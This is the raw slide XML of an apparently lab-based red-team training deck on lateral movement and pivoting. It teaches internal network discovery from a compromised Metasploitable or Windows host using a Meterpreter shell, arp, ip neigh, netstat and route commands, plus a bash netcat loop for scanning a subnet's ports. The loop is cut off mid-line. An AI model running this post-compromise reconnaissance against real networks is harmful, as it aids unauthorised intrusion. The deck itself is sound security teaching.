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8" r:id="rId3"/>
    <p:sldId id="257" r:id="rId4"/>
    <p:sldId id="258" r:id="rId5"/>
    <p:sldId id="282" r:id="rId6"/>
    <p:sldId id="268" r:id="rId7"/>
    <p:sldId id="299" r:id="rId8"/>
    <p:sldId id="259" r:id="rId9"/>
    <p:sldId id="301" r:id="rId10"/>
    <p:sldId id="269" r:id="rId11"/>
    <p:sldId id="300" r:id="rId12"/>
    <p:sldId id="272" r:id="rId13"/>
    <p:sldId id="307" r:id="rId14"/>
    <p:sldId id="273" r:id="rId15"/>
    <p:sldId id="308" r:id="rId16"/>
    <p:sldId id="309" r:id="rId17"/>
    <p:sldId id="302" r:id="rId18"/>
    <p:sldId id="260" r:id="rId19"/>
    <p:sldId id="261" r:id="rId20"/>
    <p:sldId id="310" r:id="rId21"/>
    <p:sldId id="274" r:id="rId22"/>
    <p:sldId id="285" r:id="rId23"/>
    <p:sldId id="286" r:id="rId24"/>
    <p:sldId id="303" r:id="rId25"/>
    <p:sldId id="262" r:id="rId26"/>
    <p:sldId id="275" r:id="rId27"/>
    <p:sldId id="263" r:id="rId28"/>
    <p:sldId id="264" r:id="rId29"/>
    <p:sldId id="277" r:id="rId30"/>
    <p:sldId id="276" r:id="rId31"/>
    <p:sldId id="305" r:id="rId32"/>
    <p:sldId id="265" r:id="rId33"/>
    <p:sldId id="306" r:id="rId34"/>
    <p:sldId id="266" r:id="rId35"/>
    <p:sldId id="267" r:id="rId36"/>
    <p:sldId id="278" r:id="rId37"/>
    <p:sldId id="279" r:id="rId38"/>
    <p:sldId id="280" r:id="rId39"/>
    <p:sldId id="281" r:id="rId40"/>
    <p:sldId id="296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A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21" autoAdjust="0"/>
    <p:restoredTop sz="94660"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr>
        <p:scale>
          <a:sx n="100" d="100"/>
          <a:sy n="100" d="100"/>
        </p:scale>
        <p:origin x="72" y="-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67AB-2715-4388-9897-0C453AA14181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B5EE-66B2-48A9-B2A7-6EE696AFD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06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67AB-2715-4388-9897-0C453AA14181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B5EE-66B2-48A9-B2A7-6EE696AFD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82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67AB-2715-4388-9897-0C453AA14181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B5EE-66B2-48A9-B2A7-6EE696AFD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75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67AB-2715-4388-9897-0C453AA14181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B5EE-66B2-48A9-B2A7-6EE696AFD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25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67AB-2715-4388-9897-0C453AA14181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B5EE-66B2-48A9-B2A7-6EE696AFD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66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67AB-2715-4388-9897-0C453AA14181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B5EE-66B2-48A9-B2A7-6EE696AFD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69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67AB-2715-4388-9897-0C453AA14181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B5EE-66B2-48A9-B2A7-6EE696AFD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405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67AB-2715-4388-9897-0C453AA14181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B5EE-66B2-48A9-B2A7-6EE696AFD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21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67AB-2715-4388-9897-0C453AA14181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B5EE-66B2-48A9-B2A7-6EE696AFD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051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67AB-2715-4388-9897-0C453AA14181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B5EE-66B2-48A9-B2A7-6EE696AFD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735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67AB-2715-4388-9897-0C453AA14181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B5EE-66B2-48A9-B2A7-6EE696AFD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346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467AB-2715-4388-9897-0C453AA14181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3B5EE-66B2-48A9-B2A7-6EE696AFD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755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mailto:msfadmin@192.168.1.44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 Umar </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Niaz</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Red </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>TeamTrainer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Cyberster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268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Week 06: Lateral Movement &amp; Network Pivoting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Objective</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: To master the art of moving through an internal network after the initial breach and reaching "isolated" machines that are not directly connected to the internet. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="239232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317500"/>
            <a:ext cx="12001500" cy="10080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Task 01: Internal Network Discovery (Living off the Land)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54150"/>
            <a:ext cx="12192000" cy="5581650"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>Task 01: Internal Network Discovery (Living off the Land) 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○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>Description</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>: Use the compromised machine to find other targets in the same internal network. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>Technical Requirements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>Network Mapping</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>: Use built-in OS tools like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>arp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> -a, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>netstat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>ano</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> neigh to identify other active IPs in the subnet. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>Scanning from the Inside</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>: Upload a static version of nmap or use a simple Bash/PowerShell loop to </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>scan for open ports (like 80, 445, 3389) on neighboring internal IPs. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>Learning Goal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>: Understand that you shouldn't always upload heavy tools; using what's already</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> on the system is quieter and more professional. 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864186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5367" y="150590"/>
            <a:ext cx="6582881" cy="648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 (What you are doing)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already have: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Kali (attacker machine)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Machine 1 (compromised / pivot host)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🎯 Goal → Reach Machine 2 (internal, not directly accessible)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This task uses Machine 1 to discover other hosts in the internal network.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⚔️ Task 01: Internal Network Discovery (Living off the Land)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b="1" dirty="0"/>
              <a:t>Task 01: Internal Network Discovery (Network Mapping)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Commands are executed on the compromised host (Machine 1) using a system shell.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>shell</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Now you get:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>$</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>👉 THIS is a real Linux shell</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Now run:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" latinLnBrk="1">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="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/>
              <a:t>arp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> -a  &gt; arp.txt                            </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> neigh &gt; ip.txt               or   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route print &gt; route.txt</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>netstat -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>tulnp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>  &gt; nest.txt      or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netstat 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ano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&gt; netstat.txt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-a = all connections, -n = numeric, -o = process IDs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314" y="1939946"/>
            <a:ext cx="5039428" cy="129358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282" y="682715"/>
            <a:ext cx="1562769" cy="8812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8D8ECC-F36A-416E-AC9E-032176692EE1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6658248" y="150590"/>
            <a:ext cx="518863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Example Output:-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800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Visual scenario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/>
              <a:t>See the results </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>type route.txt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>In </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>cmd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> compromised shell 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905074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176963"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>arp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> =</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Address Resolution Protocol</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Which IP addresses are mapped to which MAC addresses on the local network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🎯 Why it matters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Shows </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>devices your machine has communicated with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Helps identify </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>active hosts on LAN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/>
              <a:t>Theme :- “Once inside a machine, use its perspective to map the internal network”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This is called:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Local enumeration</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Internal reconnaissance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45" y="2895929"/>
            <a:ext cx="4567228" cy="65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80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61556"/>
            <a:ext cx="12192000" cy="689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ip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neigh   or  route print&gt;  route.txt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What it means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neigh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Neighbor table (modern ARP)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does the same job as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but more detailed and modern.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🎯 Why it matters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More accurate than </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>arp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>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Shows </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>live vs dead hosts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🧩 Important states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 Unicode MS"/>
              </a:rPr>
              <a:t>REACHABLE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> → Active host 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 Unicode MS"/>
              </a:rPr>
              <a:t>STALE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> → Seen before 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 Unicode MS"/>
              </a:rPr>
              <a:t>FAILED</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> → Not reachable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3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>netstat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>tulnp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="18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👉 What it means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 Unicode MS"/>
              </a:rPr>
              <a:t>-t</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> → TCP connections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 Unicode MS"/>
              </a:rPr>
              <a:t>-u</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> → UDP connections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 Unicode MS"/>
              </a:rPr>
              <a:t>-l</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> → Listening ports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 Unicode MS"/>
              </a:rPr>
              <a:t>-n</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> → Show IPs (no DNS)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 Unicode MS"/>
              </a:rPr>
              <a:t>-p</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> → Show process using the port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7010"/>
            <a:ext cx="7803382" cy="66201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88852"/>
            <a:ext cx="6286500" cy="66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33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145170"/>
            <a:ext cx="12668250" cy="6726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🎯 Why it matters</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>This tells you:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>What services are running </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>What ports are open </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Which process is using them </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>👉 Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Port 22 → SSH </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Port 80 → Web server </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Port 445 → SMB</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US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⚡ Simple Mental Model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err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>arp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/>
              <a:t> / </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> neigh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/>
              <a:t> → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Who is on the network?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err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>netstat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/>
              <a:t> → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>What is running on this machine?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771886"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="2851150" y="2030375"/>
          <a:ext cx="8127999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26790883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5685899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044322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What it tells you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4816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arp -a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Known devices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Quick network awareness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4486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ip</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t> neigh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Active neighbors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Live host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3718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netstat</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t> -</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>tulnp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 ports/services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What’s running locally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7878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2484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n-US" sz="1900" b="1" dirty="0"/>
              <a:t>On Windows (Machine 1):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>From Meterpreter</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>🔑 You must do this first:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>shell</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Now you get:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>C:\&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>👉 THIS is a real Windows shell</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Now run:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>arp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t> -a</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>netstat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>ano</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>  ipconfig</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>👉 Outcome:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Identify internal IP range (e.g., 192.168.1.0/24) </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>List active hosts </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Identify running services and listening ports </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>Internal Port Scanning</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Commands are executed on the compromised host (Machine 1) to identify open ports on </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>internal systems.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" b="1" dirty="0"/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120361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176963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What Happens Step-by-Step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Take IP → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>192.168.1.1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t> 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dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>netcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> scan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dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Show only open ports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en-US" altLang="en-US" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Move to next IP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lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Repeat until </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>.254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For every IP in this network, check if ports 22, 80, 445, and 3389 are open, and only show the ones that are open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⚡ Example Output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 Unicode MS"/>
              </a:rPr>
              <a:t>192.168.1.10 80 open</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>192.168.1.15 445 open</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>192.168.1.20 3389 open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871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934"/>
            <a:ext cx="5849166" cy="67701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b="1" dirty="0"/>
              <a:t>Method 1: Simple Bash loop (inside the compromised shell of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0" err="1"/>
              <a:t>metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t> 2)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7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> in 192.168.1.{1..254}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7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>do  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>zv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
